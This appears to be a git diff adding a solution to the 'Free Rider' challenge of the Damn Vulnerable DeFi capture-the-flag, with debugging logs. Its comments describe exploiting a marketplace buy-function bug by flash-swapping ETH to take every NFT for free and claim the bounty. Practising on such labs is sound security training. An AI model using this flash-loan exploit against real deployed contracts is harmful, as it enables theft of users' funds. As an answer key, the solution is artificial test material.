@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {FlashSwapper} from "./FlashSwapper.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,8 +124,15 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
+        // Flash swap 90 ether to buy all the NFTs, due to the bug in the buy function the NFTs will be for free
+        // So the flash swap can be paid back and the 45 ETH bounty can be collected
+        console.log("Weth address:", address(weth));
+        FlashSwapper swapper = new FlashSwapper(address(uniswapV2Factory), address(weth), address(marketplace), address(recoveryManager));
+        swapper.startFlashSwap(address(token), 15 ether);
         
     }
+
+   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -139,10 +147,14 @@ contract FreeRiderChallenge is Test {
 
         // Exchange must have lost NFTs and ETH
         assertEq(marketplace.offersCount(), 0);
+        console.log("Marketplace balance:", address(marketplace).balance);
         assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
-
+        // 15.000000000000000000
+        //120.054864593781344032
         // Player must have earned all ETH
+        console.log("Player balance:", player.balance);
         assertGt(player.balance, BOUNTY);
+        console.log("Recovery manager balance:", address(recoveryManager).balance);
         assertEq(address(recoveryManager).balance, 0);
     }
 }
